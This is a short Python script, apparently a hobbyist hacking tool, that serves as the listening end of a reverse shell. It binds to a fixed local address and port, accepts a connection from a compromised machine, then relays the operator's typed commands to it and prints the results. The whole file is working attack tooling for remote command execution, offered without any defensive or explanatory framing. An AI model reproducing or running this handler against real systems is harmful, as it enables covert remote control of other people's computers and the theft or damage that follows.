#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/22/2021

import socket
from termcolor import colored
import subprocess

def shell():
    while True:
        command = input("Shell#~%s: " % str(ip))
        target.send(command.encode())
        if command == ':q':
            break
        else:
            result = target.recv(1024)
            print(result.decode())

def server():
    global sock
    global ip
    global target

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("192.168.7.125", 54321))
    sock.listen(5)
    print(colored("[!] Listening For Incoming Connections", "yellow"))
    target, ip = sock.accept()
    print(colored("[+] Connection Established From : %s" % str(ip), "green"))

server()
shell()
sock.close()
